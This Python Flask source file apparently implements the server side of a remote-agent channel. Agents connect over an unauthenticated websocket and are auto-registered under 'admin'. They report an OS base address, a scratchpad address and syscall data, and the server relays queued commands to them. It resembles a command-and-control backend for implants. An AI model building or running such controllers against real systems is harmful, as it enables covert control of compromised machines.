from __future__ import annotations

import logging
import struct
import threading
import time
import traceback
ATTEMPTS = 100
from flask import Blueprint, current_app
from sqlalchemy import select

from routes.auth.sudo.system import sock
from models.agent import Agent
from models.request import Request
from models.syscall import Syscall
from utils import profile
from services.orders import responses as agent_responses

logger = logging.getLogger(__name__)

bp = Blueprint("agent", __name__, url_prefix="/agent")
requests = {}
responses = {}
alive_agents = set()

def split_three(data: bytes | bytearray):
    first = data[:8]
    second = data[8:16]
    rest = data[16:]
    return first, second, rest


def parse_handshake(msg: bytes, agent_id: str) -> None:
    os_bytes, scratchpad, syscall_blob = split_three(msg)

    agent = Agent.by_id(agent_id)
    if agent is None:
        return

    agent.os = struct.unpack("<Q", os_bytes)[0]
    agent.scratchpad = struct.unpack("<Q", scratchpad)[0]

    print(
        f"New agent os = {hex(agent.os)} {len(os_bytes)}, "
        f"scratchpad = {hex(agent.scratchpad)}"
    )

    Syscall.save_syscalls_bytes(agent.id, syscall_blob)
    agent.save()


def handle_msg_type(agent_id):
    attempts = ATTEMPTS
    while True:
        attempts = attempts -1
        if agent_id in agent_responses.keys() and agent_responses[agent_id] or attempts ==0:
            msg = agent_responses[agent_id]
            del agent_responses[agent_id]
            break
        time.sleep(0.1)

    msg_type = msg[0]
    payload = msg[1:]

    if msg_type == 0x00:
        profile(parse_handshake, payload, agent_id)
        return None
    if msg_type == 0x01:
        return payload

    return None


def create_handshake(agent_id: str) -> None:
    to_send = bytearray()
    to_send.extend(b"\x00")
    requests[agent_id] = to_send
    handle_msg_type(agent_id)


@sock.route(f"/api/v1/anon{bp.url_prefix}/ws/<agent_id>")
def server_agent_ws(ws, agent_id):
    global requests
    global responses

    print(f"Starting websocket for agent {agent_id}...")

    agent = Agent.by_id(agent_id)
    if agent is None:
        agent = Agent(agent_id, "admin")
        agent.save()

    app = current_app._get_current_object()
    stop_event = threading.Event()

    def poll_requests():
        global requests

        with app.app_context():
            while not stop_event.is_set():
                alive_agents.add(agent_id)
                try:
                    while True:
                        time.sleep(0.1)
                        if agent_id in requests.keys() and requests[agent_id]:
                            msg = requests[agent_id]
                            break
                        if stop_event.is_set():
                            break
                    ws.send(bytes(msg))
                    del requests[agent_id]
                    
                except Exception:
                    logger.exception("Polling request failed for agent %s", agent_id)
                    stop_event.set()

    threading.Thread(target=poll_requests, daemon=True).start()
    threading.Thread(target=create_handshake, args=(agent_id,), daemon=True).start()

    try:
        while not stop_event.is_set():
            try:
                message = ws.receive()
            except Exception:
                traceback.print_exc()
                logger.info("WebSocket receive failed/closed for agent %s", agent_id)
                break

            if message is None:
                logger.info("WebSocket closed for agent %s", agent_id)
                break

            agent_responses[agent_id] = message

    finally:
        print(f"Closing websocket with agent {agent_id}")
        stop_event.set()

        try:
            print(f"Setting {agent_id} as offline")
            agent.delete()
            alive_agents.discard(agent_id)
        except Exception:
            logger.exception("Failed updating agent %s offline state", agent_id)

        try:
            ws.close()
        except Exception:
            pass